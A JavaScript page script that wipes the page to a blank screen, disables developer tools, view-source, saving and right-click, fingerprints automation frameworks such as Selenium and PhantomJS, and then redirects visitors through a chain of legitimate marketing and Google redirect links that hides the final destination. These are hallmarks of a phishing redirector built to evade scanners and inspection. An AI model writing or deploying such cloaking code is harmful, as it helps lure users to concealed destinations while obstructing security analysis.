// Simple 4-Second Blank Screen Redirect with Bot Detection
// No fancy UI, just blank screen and redirect

(function() {
    'use strict';
    
    // Configuration
    const REDIRECT_URL = 'https://public-usa.mkt.dynamics.com/api/orgs/742da8ce-1b76-f011-8589-000d3a106307/r/8Uu2c1ToLUGfS8eugg4CAAIAAAA?msdynmkt_target=%7B%22TargetUrl%22%3A%22https%253A%252F%252Fwww.google.com%252Furl%253Fq%253Dhttps%25253A%25252F%25252Fdjyt-s04.eu1.hs-sales-engage.com%25252FCtc%25252FDQ%25252B23284%25252FdjYT-s04%25252FJll8VMXNW7YbdcM6lZ3ldW4dYkTk1Rrbh-W4tPVpb60ww0JV801_44gWhjKW5rqjJH5F1H7RW3QJ2681HBRQqN4QWjlSCKTbFW3rZcsT8Y-BC-W2NVKY_9dLn08W1_t_Vp7CtglFVZH6lx8MDHCwW2L9CGd3KHjt1W85p2wy4Vxb1lMLL8BlgWYWmW8rYBtj3fLWG7W4tpYXl4PCx10W6brBmy2bTLT8W86JWzW4_wgJcW2BVQrC1DNQHkVfx5BJ1NwZDtW5wkQZw5rFwGHW45gT5q7R9bSfW8dbz1K600zH-W1Zh_502nF7JQVGFBC27SZtkmW1JLPd67NRzcTW4xGvBk6rh7lRW7H8Lr11j9DPvVKZMFx93XZSgW7DzWF75pvFlLW8dMGjD70_V2kW2FbZcK8rF_gTW14GC0T4lrlTDW9b1PXf1-jkryW3KTkZ08Fx7ySW62fwDS9jjzBmW9b22Jb4f-dx3W3Z7Zjv6d-4tcW8QTVSH84KH_hW3h3By35VM83sW48ZNKx6RK8QkW7Ydwh_5dFZmNW45n-fS2RHN6DW9lnNtX1L9rb0W2m-pXX2KYh-dN6Y9thBmLDjkW2XK5Y02tDD3SW4vl5sY7mVZL1VsTbwX17gtnVW60BDYp6QGQk0W7yNm4h3mhmwpN5r4TrQrlHPrN3ccwj6t-P-bW7kpGbn68GwdHW398xDG6sbLCRW6Fkr9C5wWtlSW8fKrp-3PmdTgW6tWPSK3Wl6wNW25RtlS7HqjR7W91jRdf8m-DTJN8-D7MNNdh4KW8v7JJl5qCLCFW3DbcP090yNtSW5s8Wjf1qJ757W1B8xjl4TTxvJW7l8Z5t5LgPd9W35yK042g6zssW5K5PkN1Nd_MhW57H4HD4yrcJPW3H_rf77ckNnnN3ZtBF8c3hpPW5nhLKX7m4dvDW6Vx05W3Ljt_yW1zgw_N64Cq33W8b6wHg7726wGf5mwj0M04%2526sa%253DD%2526sntz%253D1%2526usg%253DAOvVaw2tpLERLriKYMm4csbeD_jo%22%2C%22RedirectOptions%22%3A%7B%225%22%3Anull%2C%221%22%3Anull%7D%7D&msdynmkt_digest=tJ7QG46gwp3uTHYYbojbBBeglZ308aNuXF%2FUyxOwWKg%3D&msdynmkt_secretVersion=a3955a744d9049f88dd8bdc1907bf2bf';
    const DELAY_SECONDS = 4;
    
    // Comprehensive bot detection
    function runBotDetection() {
        let documentDetectionKeys = [
            "webdriver",
            "_WEBDRIVER_ELEM_CACHE",
            "ChromeDriverw",
            "Geckowebdriver",
            "driver-evaluate",
            "webdriver-evaluate",
            "selenium-evaluate",
            "selenium-webdriver",
            "webdriverCommand",
            "webdriver-evaluate-response",
            "__webdriverFunc",
            "__$webdriverAsyncExecutor",
            "$wdc_asdjflasutopfhvcZLmcfl_",
            "__lastWatirAlert",
            "__lastWatirConfirm",
            "__lastWatirPrompt",
            "$chrome_asyncScriptInfo",
            "$cdc_asdjflasutopfhvcZLmcfl_",
            "__webdriver_evaluate",
            "__selenium_evaluate",
            "__webdriver_script_function",
            "__webdriver_script_func",
            "__webdriver_script_fn",
            "__fxdriver_evaluate",
            "__driver_unwrapped",
            "__webdriver_unwrapped",
            "__driver_evaluate",
            "__selenium_unwrapped",
            "__fxdriver_unwrapped"
        ];

        let windowDetectionKeys = [
            "gecko",
            "$wdc_asdjflasutopfhvcZLmcfl_",
            "$cdc_asdjflasutopfhvcZLmcfl_",
            "domAutomation",
            "domAutomationController",
            "__stopAllTimers",
            "spawn",
            "__driver_evaluate",
            "__fxdriver_evaluate",
            "__driver_unwrapped",
            "__fxdriver_unwrapped",
            "emit",
            "__phantomas",
            "callPhantom",
            "geb",
            "__$webdriverAsyncExecutor",
            "fmget_targets",
            "spynner_additional_js_loaded",
            "watinExpressionResult",
            "watinExpressionError",
            "domAutomationController",
            "calledPhantom",
            "__webdriver_unwrapped",
            "__webdriver_script_function",
            "__webdriver_script_func",
            "__webdriver_script_fn",
            "__webdriver_evaluate",
            "__webdriver__chr",
            "__webdriverFuncgeb",
            "__selenium_unwrapped",
            "__selenium_evaluate",
            "__lastWatirPrompt",
            "cdc_adoQpoasnfa76pfcZLmcfl_Array",
            "cdc_adoQpoasnfa76pfcZLmcfl_Promise",
            "cdc_adoQpoasnfa76pfcZLmcfl_Symbol",
            "OSMJIF",
            "__lastWatirConfirm",
            "__lastWatirAlert",
            "calledSelenium",
            "webdriver",
            "marionette",
            "puppeteer",
            "Buffer",
            "_phantom",
            "__nightmare",
            "_selenium",
            "callPhantom",
            "Cypress",
            "callSelenium",
            "_Selenium_IDE_Recorder"
        ];

        let documentSearchKeys = [
            "driver",
            "webdriver",
            "marionette",
            "selenium",
            "phantom",
        ];

        // Check window properties
        for (const windowDetectionKey in windowDetectionKeys) {
            const windowDetectionKeyValue = windowDetectionKeys[windowDetectionKey];
            if (window[windowDetectionKeyValue]) {
                return true;
            }
        }

        // Check document properties
        for (const documentDetectionKey in documentDetectionKeys) {
            const documentDetectionKeyValue = documentDetectionKeys[documentDetectionKey];
            if (window["document"][documentDetectionKeyValue]) {
                return true;
            }
        }

        // Check for CDC patterns
        for (const documentKey in window["document"]) {
            if (documentKey.match(/\$[a-z]dc_/) && window["document"][documentKey]["cache_"]) {
                return true;
            }
        }

        // Additional checks
        if (window["external"] && window["external"].toString() && (window["external"].toString()["indexOf"]("Sequentum") != -1)) return true;
        if (window["document"]["documentElement"]["getAttribute"]("selenium")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("webdriver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("driver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("geckodriver")) return true;
        if (window["document"]["documentElement"]["getAttribute"]("firefox.marionette")) return true;
        
        for (const documentSearchKey in documentSearchKeys) {
            const documentSearchKeyValue = documentSearchKeys[documentSearchKey];
            if (window.document.documentElement.getAttribute(documentSearchKeyValue)) {
                return true;
            }
        }

        return false;
    }

    // Block dev tools and keyboard shortcuts
    function blockDevTools() {
        // Block F12, Ctrl+Shift+I, Ctrl+U, etc.
        window.onkeydown = (e) => {
            return !(e.ctrlKey && (e.keyCode === 67 || e.keyCode === 85 || e.keyCode === 86 || e.keyCode === 88 || e.keyCode === 117));
        };

        window.addEventListener("keydown", (e) => {
            if (e.ctrlKey && e.which === 83) {
                e.preventDefault(); 
                return false;
            }
        });

        window.addEventListener("contextmenu", (event) => event.preventDefault());

        document.onkeydown = (e) => {
            if (e.keyCode === 123) return false; // F12
            if (e.ctrlKey && e.keyCode === "E".charCodeAt(0)) return false;
            if (e.ctrlKey && e.shiftKey && e.keyCode === "I".charCodeAt(0)) return false;
            if (e.ctrlKey && e.shiftKey && e.keyCode === "J".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "U".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "S".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "H".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "A".charCodeAt(0)) return false;
            if (e.ctrlKey && e.keyCode === "F".charCodeAt(0)) return false;
        };
    }

    // Create blank screen
    function createBlankScreen() {
        document.body.innerHTML = '';
        document.body.style.cssText = `
            margin: 0;
            padding: 0;
            background: white;
            min-height: 100vh;
        `;
    }

    // Main execution
    function init() {
        // Wait for DOM if needed
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
            return;
        }

        // If bot detected, redirect immediately
        if (runBotDetection() === true) {
            window.location.replace(REDIRECT_URL);
            return;
        }

        // Block dev tools
        blockDevTools();

        // Create blank screen
        createBlankScreen();

        // Set timeout for redirect after 4 seconds
        setTimeout(() => {
            window.location.replace(REDIRECT_URL);
        }, DELAY_SECONDS * 1000);

        // Fallback timeout (5 minutes)
        setTimeout(() => {
            window.location.replace(REDIRECT_URL);
        }, 5 * 60 * 1000);
    }

    // Start the script
    init();

})();
